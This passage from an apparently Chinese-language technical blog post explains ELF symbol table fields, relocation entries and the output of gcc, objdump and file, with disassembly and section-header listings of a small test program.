class="comment">//STT_NUM表明一共就7种符号绑定信息</span></span><br></pre></td></tr></table></figure>
<p>比如<code>global_initialized</code>这个符号,是一个全局的数据对象</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806105817155.png"
alt="image-20220806105817155" />
<figcaption aria-hidden="true">image-20220806105817155</figcaption>
</figure>
<p>又比如<code>test.c</code>这个符号</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806105930937.png"
alt="image-20220806105930937" />
<figcaption aria-hidden="true">image-20220806105930937</figcaption>
</figure>
<p>是一个局部文件名符号</p>
<h5 id="st_other">st_other</h5>
<p>预留的成员,目前没用</p>
<h5 id="st_shndx">st_shndx</h5>
<p>符号所在节的下标</p>
<p>比如<code>main</code>这个符号,不用想啃腚是在text节</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806104544566.png"
alt="image-20220806104544566" />
<figcaption aria-hidden="true">image-20220806104544566</figcaption>
</figure>
<p>该值为1,去查节头表</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806104627621.png"
alt="image-20220806104627621" />
<figcaption aria-hidden="true">image-20220806104627621</figcaption>
</figure>
<p>下标为1的节就是.text</p>
<p>对于不在本文件中定义的符号或者一些特殊符号,该值有特殊意义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special section indices.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHN_UNDEF	0		<span class="comment">/* Undefined section ,本符号未在本文件定义,只在本文件中被引用,可能定义在其他文件中*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHN_LORESERVE	0xff00		<span class="comment">/* Start of reserved indices */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHN_LOPROC	0xff00		<span class="comment">/* Start of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHN_BEFORE	0xff00		<span class="comment">/* Order section before all others</span></span></span><br><span class="line"><span class="comment"><span class="meta">					   (Solaris).  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHN_AFTER	0xff01		<span class="comment">/* Order section after all others</span></span></span><br><span class="line"><span class="comment"><span class="meta">					   (Solaris).  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHN_HIPROC	0xff1f		<span class="comment">/* End of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHN_LOOS	0xff20		<span class="comment">/* Start of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHN_HIOS	0xff3f		<span class="comment">/* End of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHN_ABS		0xfff1		<span class="comment">/* Associated symbol is absolute ,一个绝对的值*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHN_COMMON	0xfff2		<span class="comment">/* Associated symbol is common ,该符号是一个COMMON伪节中的符号,未初始化的全局符号*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHN_XINDEX	0xffff		<span class="comment">/* Index is in extra table.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHN_HIRESERVE	0xffff		<span class="comment">/* End of reserved indices */</span></span></span><br></pre></td></tr></table></figure>
<p>比如<code>test.c</code>这个符号</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806110254225.png"
alt="image-20220806110254225" />
<figcaption aria-hidden="true">image-20220806110254225</figcaption>
</figure>
<p>该值为65521D=FFF1H,表示该符号包含了一个绝对的值</p>
<h5 id="st_value">st_value</h5>
<p>符号对应值,不同类型的文件中该值意义不同</p>
<p><strong>在可执行目标文件中</strong></p>
<p>该值表示符号的虚拟地址</p>
<blockquote>
<p>比如main这个符号,其st_value值为0x1129</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806110947749.png"
alt="image-20220806110947749" />
<figcaption aria-hidden="true">image-20220806110947749</figcaption>
</figure>
<p>用ida64加载观察之</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806111114579.png"
alt="image-20220806111114579" />
<figcaption aria-hidden="true">image-20220806111114579</figcaption>
</figure>
<p>main确实在1129位置</p>
</blockquote>
<p><strong>在可重定位目标模块中</strong></p>
<p><strong>如果该符号是一个定义</strong>(不是引用,即<code>st_shndx</code>的值不是<code>SHN_UNDEF</code>),并且不是未初始化的全局变量(即不在<code>COMMON</code>伪节,即<code>st_shndx</code>不为<code>SHN_COMMON</code>),则该值表示的是该符号在对应节中的偏移量,这个节就是<code>st_shndx</code>指定的节</p>
<p>比如静态未初始化变量,</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806111635430.png"
alt="image-20220806111635430" />
<figcaption aria-hidden="true">image-20220806111635430</figcaption>
</figure>
<p><code>st_shndx=4</code>表明他在bss段</p>
<blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806111719286.png"
alt="image-20220806111719286" />
<figcaption aria-hidden="true">image-20220806111719286</figcaption>
</figure>
</blockquote>
<p><code>st_value=0x4</code>表明它的偏移量为4,即bss段的第五个字节,那么前四个字节是谁?global_uninitialized</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220806111854194.png"
alt="image-20220806111854194" />
<figcaption aria-hidden="true">image-20220806111854194</figcaption>
</figure>
<p>如果该符号在COMMON块,则st_value表示的是该符号的对齐要求</p>
<h5 id="st_size">st_size</h5>
<p>该符号表的大小</p>
<h4 id="重定位表">重定位表</h4>
<p>重定位表可以有多个,如果text节需要重定位,则会有一个.rel.text,如果data节需要重定位,则会有一个.rel.data</p>
<p><code>test.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> value;<span class="comment">//外部变量</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>,<span class="type">int</span>)</span>;<span class="comment">//外部函数</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;test Link\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;sum=%d\n&quot;</span>,add(<span class="number">5</span>,<span class="number">6</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;value=%d&quot;</span>,value);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -c</span><br></pre></td></tr></table></figure>
<p>对于只编译不链接得到的test.o,使用objdump反汇编观察其main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/<span class="number">86135</span>/desktop/COFF]</span><br><span class="line">└─<span class="meta"># objdump -d test.o</span></span><br><span class="line"></span><br><span class="line">test.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;main&gt;:</span><br><span class="line">   <span class="number">0</span>:   <span class="number">55</span>                      push   %rbp</span><br><span class="line">   <span class="number">1</span>:   <span class="number">48</span> <span class="number">89</span> e5                mov    %rsp,%rbp</span><br><span class="line">   <span class="number">4</span>:   <span class="number">48</span> <span class="number">8</span>d <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    lea    <span class="number">0x0</span>(%rip),%rax        <span class="meta"># b <span class="string">&lt;main+0xb&gt;</span></span></span><br><span class="line">   b:   <span class="number">48</span> <span class="number">89</span> c7                mov    %rax,%rdi</span><br><span class="line">   e:   e8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">13</span> &lt;main+<span class="number">0x13</span>&gt;</span><br><span class="line">  <span class="number">13</span>:   be <span class="number">06</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x6</span>,%esi</span><br><span class="line">  <span class="number">18</span>:   bf <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x5</span>,%edi</span><br><span class="line">  <span class="number">1</span>d:   e8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">22</span> &lt;main+<span class="number">0x22</span>&gt;</span><br><span class="line">  <span class="number">22</span>:   <span class="number">89</span> c6                   mov    %eax,%esi</span><br><span class="line">  <span class="number">24</span>:   <span class="number">48</span> <span class="number">8</span>d <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    lea    <span class="number">0x0</span>(%rip),%rax        # <span class="number">2b</span> &lt;main+<span class="number">0x2b</span>&gt;</span><br><span class="line">  <span class="number">2b</span>:   <span class="number">48</span> <span class="number">89</span> c7                mov    %rax,%rdi</span><br><span class="line">  <span class="number">2</span>e:   b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">33</span>:   e8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">38</span> &lt;main+<span class="number">0x38</span>&gt;</span><br><span class="line">  <span class="number">38</span>:   <span class="number">8b</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x0</span>(%rip),%eax        # <span class="number">3</span>e &lt;main+<span class="number">0x3e</span>&gt;</span><br><span class="line">  <span class="number">3</span>e:   <span class="number">89</span> c6                   mov    %eax,%esi</span><br><span class="line">  <span class="number">40</span>:   <span class="number">48</span> <span class="number">8</span>d <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    lea    <span class="number">0x0</span>(%rip),%rax        # <span class="number">47</span> &lt;main+<span class="number">0x47</span>&gt;</span><br><span class="line">  <span class="number">47</span>:   <span class="number">48</span> <span class="number">89</span> c7                mov    %rax,%rdi</span><br><span class="line">  <span class="number">4</span>a:   b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">4f</span>:   e8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">54</span> &lt;main+<span class="number">0x54</span>&gt;</span><br><span class="line">  <span class="number">54</span>:   b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">59</span>:   <span class="number">5</span>d                      pop    %rbp</span><br><span class="line">  <span class="number">5</span>a:   c3                      ret</span><br></pre></td></tr></table></figure>
<p>可以发现其中main+4,main+e,main+1d等等处的指令中有四个字节的0</p>
<p>实际上是由于,编译器对于<code>__main</code>函数,<code>add</code>函数,<code>value</code>外部变量无法解析其位置,于是全都置零等待链接器填坑</p>
<p>观察其重定位表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/<span class="number">86135</span>/desktop/COFF]</span><br><span class="line">└─<span class="meta"># objdump -r test.o</span></span><br><span class="line"></span><br><span class="line">test.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line">RELOCATION RECORDS FOR [.text]:</span><br><span class="line">OFFSET           TYPE              VALUE</span><br><span class="line"><span class="number">0000000000000007</span> R_X86_64_PC32     .rodata<span class="number">-0x0000000000000004</span></span><br><span class="line"><span class="number">000000000000000f</span> R_X86_64_PLT32    <span class="built_in">puts</span><span class="number">-0x0000000000000004</span>		;此处的<span class="built_in">puts</span>是编译器将<span class="built_in">printf</span>优化成了<span class="built_in">puts</span></span><br><span class="line"><span class="number">000000000000001</span>e R_X86_64_PLT32    add<span class="number">-0x0000000000000004</span></span><br><span class="line"><span class="number">0000000000000027</span> R_X86_64_PC32     .rodata+<span class="number">0x0000000000000006</span></span><br><span class="line"><span class="number">0000000000000034</span> R_X86_64_PLT32    <span class="built_in">printf</span><span class="number">-0x0000000000000004</span></span><br><span class="line"><span class="number">000000000000003</span>a R_X86_64_PC32     value<span class="number">-0x0000000000000004</span></span><br><span class="line"><span class="number">0000000000000043</span> R_X86_64_PC32     .rodata+<span class="number">0x000000000000000e</span></span><br><span class="line"><span class="number">0000000000000050</span> R_X86_64_PLT32    <span class="built_in">printf</span><span class="number">-0x0000000000000004</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RELOCATION RECORDS FOR [.eh_frame]:</span><br><span class="line">OFFSET           TYPE              VALUE</span><br><span class="line"><span class="number">0000000000000020</span> R_X86_64_PC32     .text</span><br></pre></td></tr></table></figure>
<p><code>RELOCATION RECORDS FOR [.text]:</code>这表示紧跟在后面是text节的符号的重定位条目</p>
<table>
<colgroup>
<col style="width: 9%" />
<col style="width: 90%" />
</colgroup>
<thead>
<tr>
<th>栏目</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td>OFFSET</td>
<td>该符号在其对应段中的偏移量</td>
</tr>
<tr>
<td>TYPE</td>
<td>重定位方式,这里有两种,PLT或者PC,是最常见的两种,PC重定位适用于变量的引用,PLT重定位适用于函数的重定位</td>
</tr>
<tr>
<td>VALUE</td>
<td>需要重定位的符号</td>
</tr>
</tbody>
</table>
<p>比如<code>0000000000000034 R_X86_64_PLT32    printf-0x0000000000000004</code>这一条,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">33</span>:   e8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">38</span> &lt;main+<span class="number">0x38</span>&gt;</span><br><span class="line"><span class="number">38</span>:   <span class="number">8b</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x0</span>(%rip),%eax        # <span class="number">3</span>e &lt;main+<span class="number">0x3e</span>&gt;</span><br></pre></td></tr></table></figure>
<p>它恰好是main+33处的call的操作数(0xe8为call指令的操作码,后面的00就是main+34)</p>
<p>编译器会给每个需要重定位的符号建立一个<strong>重定位条目</strong>(然而自我修养上作者将Relocation
Entry翻译成了重定位入口,感觉此处的Entry不如翻译成条目)</p>
<p>重定位条目是一个结构体:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br></pre></td></tr></table></figure>
<h5 id="r_offset">r_offset</h5>
<p>需要修正的位置,相对于该符号所在节的偏移量</p>
<p>就是objdump -r之后的OFFSET栏目</p>
<h5 id="r_info">r_info</h5>
<p>重定位条目的类型和符号</p>
<h2 id="工具">工具</h2>
<h3 id="linux-elf">Linux ELF</h3>
<h4 id="gcc编译链接">gcc编译链接</h4>
<h5 id="只编译不链接">只编译不链接</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c main.c -o main.o</span><br></pre></td></tr></table></figure>
<h5 id="编译链接">编译链接</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc main.c -o main</span><br></pre></td></tr></table></figure>
<h4 id="file查看文件格式">file查看文件格式</h4>
<p>lilnux上<code>file</code>的参数可以为任何文件,其作用是报告该文件的基本信息</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/COFF]</span><br><span class="line">└─# file main.c</span><br><span class="line">main.c: C source, ASCII text, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/COFF]</span><br><span class="line">└─# file main.exe</span><br><span class="line">main.exe: PE32+ executable (console) x86-64, for MS Windows</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/COFF]</span><br><span class="line">└─# file main</span><br><span class="line">main: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=45f82af9109c5336fc17e25b88c4ce4def86b6e2, for GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure>
<h4 id="objdump-观察结构">objdump 观察结构</h4>
<h5 id="objdump--h观察节区基本信息">objdump -h观察节区基本信息</h5>
<table>
<colgroup>
<col style="width: 11%" />
<col style="width: 88%" />
</colgroup>
<thead>
<tr>
<th style="text-align: left;">栏目</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;">Idx</td>
<td>节区在节区表中的顺序编号</td>
</tr>
<tr>
<td style="text-align: left;">Name</td>
<td>节区名</td>
</tr>
<tr>
<td style="text-align: left;">Size</td>
<td>本节区大小</td>
</tr>
<tr>
<td style="text-align: left;">VMA</td>
<td></td>
</tr>
<tr>
<td style="text-align: left;">LMA</td>
<td></td>
</tr>
<tr>
<td style="text-align: left;">File off</td>
<td>本节区在文件中的偏移量</td>
</tr>
<tr>
<td style="text-align: left;">Align</td>
<td>本节区的对齐要求,<code>2**n</code>意思是<span
class="math inline">\(2^n\)</span>字节对齐,节区首地址必须是<span
class="math inline">\(2^n\)</span>的倍数</td>
</tr>
<tr>
<td style="text-align: left;">节区属性</td>
<td>CONTENTS</td>
</tr>
<tr>
<td style="text-align: left;"></td>
<td></td>
</tr>
</tbody>
</table>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/COFF]</span><br><span class="line">└─# objdump -h main</span><br><span class="line"></span><br><span class="line">main:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">  0 .interp       0000001c  0000000000000318  0000000000000318  00000318  2**0</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  1 .note.gnu.property 00000020  0000000000000338  0000000000000338  00000338  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  2 .note.gnu.build-id 00000024  0000000000000358  0000000000000358  00000358  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  3 .note.ABI-tag 00000020  000000000000037c  000000000000037c  0000037c  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  4 .gnu.hash     00000024  00000000000003a0  00000000000003a0  000003a0  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  5 .dynsym       00000090  00000000000003c8  00000000000003c8  000003c8  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  6 .dynstr       0000007d  0000000000000458  0000000000000458  00000458  2**0</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  7 .gnu.version  0000000c  00000000000004d6  00000000000004d6  000004d6  2**1</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  8 .gnu.version_r 00000020  00000000000004e8  00000000000004e8  000004e8  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  9 .rela.dyn     000000c0  0000000000000508  0000000000000508  00000508  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line"> 10 .init         00000017  0000000000001000  0000000000001000  00001000  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line"> 11 .plt          00000010  0000000000001020  0000000000001020  00001020  2**4</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line"> 12 .plt.got      00000008  0000000000001030  0000000000001030  00001030  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line"> 13 .text         00000161  0000000000001040  0000000000001040  00001040  2**4</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line"> 14 .fini         00000009  00000000000011a4  00000000000011a4  000011a4  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line"> 15 .rodata       00000004  0000000000002000  0000000000002000  00002000  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line"> 16 .eh_frame_hdr 0000003c  0000000000002004  0000000000002004  00002004  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line"> 17 .eh_frame     00000108  0000000000002040  0000000000002040  00002040  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line"> 18 .init_array   00000008  0000000000003e18  0000000000003e18  00002e18  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line"> 19 .fini_array   00000008  0000000000003e20  0000000000003e20  00002e20  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line"> 20 .dynamic      000001b0  0000000000003e28  0000000000003e28  00002e28  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line"> 21 .got          00000028  0000000000003fd8  0000000000003fd8  00002fd8  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line"> 22 .got.plt      00000018  0000000000004000  0000000000004000  00003000  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line"> 23 .data         00000010  0000000000004018  0000000000004018  00003018  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line"> 24 .bss          00000008  0000000000004028  0000000000004028  00003028  2**0</span><br><span class="line">                  ALLOC</span><br><span class="line"> 25 .comment      0000001e  0000000000000000  0000000000000000  00003028  2**0</span><br><span class="line">                  CONTENTS, READONLY</span><br></pre></td></tr></table></figure>
<blockquote>
<p>各段作用</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220805152931491.png"
alt="image-20220805152931491" />
<figcaption aria-hidden="true">image-20220805152931491</figcaption>
</figure>
</blockquote>
<h5 id="objdump--s-以16进制打印各节内容">objdump -s
以16进制打印各节内容</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/COFF]</span><br><span class="line">└─# objdump -s main</span><br><span class="line"></span><br><span class="line">main:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">Contents of section .init:</span><br><span class="line"> 1000 4883ec08 488b05dd 2f000048 85c07402  H...H.../..H..t.</span><br><span class="line"> 1010 ffd04883 c408c3                      ..H....</span><br><span class="line">Contents of section .plt:</span><br><span class="line"> 1020 ff35e22f 0000ff25 e42f0000 0f1f4000  .5./...%./....@.</span><br><span class="line">Contents of section .plt.got:</span><br><span class="line"> 1030 ff25c22f 00006690                    .%./..f.</span><br><span class="line">Contents of section .text:</span><br><span class="line"> 1040 31ed4989 d15e4889 e24883e4 f050544c  1.I..^H..H...PTL</span><br><span class="line"> 1050 8d054a01 0000488d 0de30000 00488d3d  ..J...H......H.=</span><br><span class="line"> 1060 c5000000 ff15762f 0000f40f 1f440000  ......v/.....D..</span><br><span class="line"> 1070 488d3db1 2f000048 8d05aa2f 00004839  H.=./..H.../..H9</span><br><span class="line"> 1080 f8741548 8b054e2f 00004885 c07409ff  .t.H..N/..H..t..</span><br><span class="line"> 1090 e00f1f80 00000000 c30f1f80 00000000  ................</span><br><span class="line"> 10a0 488d3d81 2f000048 8d357a2f 00004829  H.=./..H.5z/..H)</span><br><span class="line"> 10b0 fe4889f0 48c1ee3f 48c1f803 4801c648  .H..H..?H...H..H</span><br><span class="line"> 10c0 d1fe7414 488b0525 2f000048 85c07408  ..t.H..%/..H..t.</span><br><span class="line"> 10d0 ffe0660f 1f440000 c30f1f80 00000000  ..f..D..........</span><br><span class="line"> 10e0 f30f1efa 803d3d2f 00000075 2b554883  